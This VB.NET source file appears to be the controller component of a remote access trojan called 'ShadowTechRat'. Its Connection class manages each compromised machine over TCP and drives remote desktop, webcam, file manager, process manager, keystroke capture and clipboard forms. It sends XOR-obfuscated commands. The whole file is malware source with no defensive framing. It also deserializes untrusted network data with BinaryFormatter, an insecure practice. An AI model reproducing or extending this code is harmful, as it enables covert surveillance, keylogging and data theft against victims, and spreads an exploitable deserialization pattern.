Imports System.Net, System.Net.Sockets, System.IO, System.Threading, System.Runtime.Serialization.Formatters.Binary

Public Class Connection
    Public client As TcpClient
    Dim bf As New BinaryFormatter
    Public IPAddress As String = ""
    Public infoForm As Information
    Public remoteDeskForm As RemoteDesktop
    Public webcamForm As Webcam
    Public fileManagerForm As FileManager
    Public processManagerForm As ProcessManager
    Public keystrokeCaptureForm As KeystrokeCapture
    Public chatSystemForm As ChatSystem
    Public clipboardForm As Clipboard
    Public Event GotInfo(ByVal c As Connection, ByVal info As Data)
    Public Event Disconnected(ByVal c As Connection)
    Sub New(ByVal c As TcpClient)
        client = c : IPAddress = CType(client.Client.RemoteEndPoint, IPEndPoint).Address.ToString
        infoForm = New Information(Me) : remoteDeskForm = New RemoteDesktop(Me)
        webcamForm = New Webcam(Me) : fileManagerForm = New FileManager(Me)
        processManagerForm = New ProcessManager(Me) : keystrokeCaptureForm = New KeystrokeCapture(Me)
        chatSystemForm = New ChatSystem(Me) : clipboardForm = New Clipboard(Me)
        client.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
    End Sub
    Sub Read(ByVal ar As IAsyncResult)
        Try
            If client.GetStream.DataAvailable And client.GetStream.CanRead Then
                RaiseEvent GotInfo(Me, DirectCast(bf.Deserialize(client.GetStream), Data))
            End If
            client.GetStream.Flush() : client.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
        Catch
            RaiseEvent Disconnected(Me)
        End Try
    End Sub
    Public Sub Send(ByVal Message As String, Optional ByVal pic As Image = Nothing, Optional ByVal bytes() As Byte = Nothing)
        Try
            Dim info As New Data(Encryption.XOREncryption(ShadowTechRat.key, Message), pic, bytes)
            bf.Serialize(client.GetStream, info)
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub
    Sub Leave()
        If infoForm.CanFocus Then infoForm.Close()
        If remoteDeskForm.CanFocus Then remoteDeskForm.Close()
        If webcamForm.camList.CanFocus Then webcamForm.camList.Close()
        If webcamForm.CanFocus Then webcamForm.Close()
        If fileManagerForm.CanFocus Then fileManagerForm.Close()
        If processManagerForm.CanFocus Then processManagerForm.Close()
        If keystrokeCaptureForm.CanFocus Then keystrokeCaptureForm.Close()
        If chatSystemForm.CanFocus Then chatSystemForm.Close()
        If clipboardForm.CanFocus Then clipboardForm.Close()
        System.Threading.Thread.Sleep(100)
        'Send("StopDesktop|") : Send("StopWebcam|") : Send("StopKeystrokeCapture|") : Send("StopChatSystem|")
        Send("Leave|") : client = Nothing
    End Sub
End Class
